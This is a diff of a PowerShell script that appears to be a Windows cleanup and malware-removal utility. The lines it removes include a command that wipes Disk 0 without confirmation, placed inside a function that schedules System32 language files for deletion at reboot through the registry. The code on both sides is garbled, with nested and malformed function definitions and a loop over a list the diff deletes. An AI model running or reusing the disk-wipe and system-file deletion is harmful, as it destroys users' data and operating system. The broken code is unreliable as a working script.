@@ -1059,56 +1059,10 @@ function unwanted-Software {
 
     # Ask user for action
     $choice = Read-Host "Type 'all' to uninstall everything listed, 'prompt' to uninstall one by one, or 'no' to cancel [all/prompt/no] (default: prompt)"
-
-    function Uninstall-Software {
-    param 
-        [string]$DisplayName
-  function Schedule-FileDeletionOnReboot {
     param(
         [Parameter(Mandatory=$true)]
         [string]$FilePath
     )
-# WARNING: This will erase all data on Disk 0
-Get-Disk -Number 0 | Clear-Disk -RemoveData -Confirm:$false
-
-    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
-    $valueName = "PendingFileRenameOperations"
-
-    # Prepare the delete pair: file path and empty string
-    # This tells Windows to delete the file on next reboot
-    $deletePair = @($FilePath, "")
-
-    # Read existing PendingFileRenameOperations values if exist
-    $existing = (Get-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue).$valueName
-
-    if ($existing) {
-        # Append to existing array
-        $newValue = $existing + $deletePair
-    } else {
-        $newValue = $deletePair
-    }
-
-    # Write updated PendingFileRenameOperations back to registry
-    Set-ItemProperty -Path $regPath -Name $valueName -Value $newValue -Type MultiString
-    Write-Host "Scheduled deletion of $FilePath on next reboot." -ForegroundColor Yellow
-}
-
-# Your list of files to delete
-$filesToDelete = @(
-    "C:\Windows\System32\zh-TW\cdosys.dll.mui",
-    "C:\Windows\System32\zh-TW\comctl32.dll.mui",
-    "C:\Windows\System32\zh-TW\comdlg32.dll.mui",
-    "C:\Windows\System32\zh-TW\fms.dll.mui",
-    "C:\Windows\System32\zh-TW\mlang.dll.mui",
-    "C:\Windows\System32\zh-TW\msimsg.dll.mui",
-    "C:\Windows\System32\zh-TW\msprivs.dll.mui",
-    "C:\Windows\System32\zh-TW\quickassist.exe.mui",
-    "C:\Windows\System32\zh-TW\SyncRes.dll.mui",
-    "C:\Windows\System32\zh-TW\Windows.Media.Speech.UXRes.dll.mui",
-    "C:\Windows\System32\zh-TW\windows.ui.xaml.dll.mui",
-    "C:\Windows\System32\zh-TW\WWAHost.exe.mui"
-)
-
 foreach ($file in $filesToDelete) {
     if (Test-Path $file) {
         Write-Host "`nProcessing file: $file" -ForegroundColor Cyan
@@ -1135,6 +1089,7 @@ foreach ($file in $filesToDelete) {
         Write-Host "File not found: $file" -ForegroundColor Yellow
     }
 }
+  
 
 Write-Host "`nAll done! Please reboot the system to complete deletions." -ForegroundColor Magenta
 
@@ -1259,10 +1214,11 @@ try {
                 Write-Host "Error searching for 'everything' folders: $_" -ForegroundColor Red
             }
         }
+        Write-Host "`n--- Unwanted Software Scan Complete ---`n"
     }
 
-    Write-Host "`n--- Unwanted Software Scan Complete ---`n"
-}
+    
+
 
 function Malware {
     Write-Host "`n--- Starting: Malware Protection & Removal ---`n" -ForegroundColor $ColorHeader
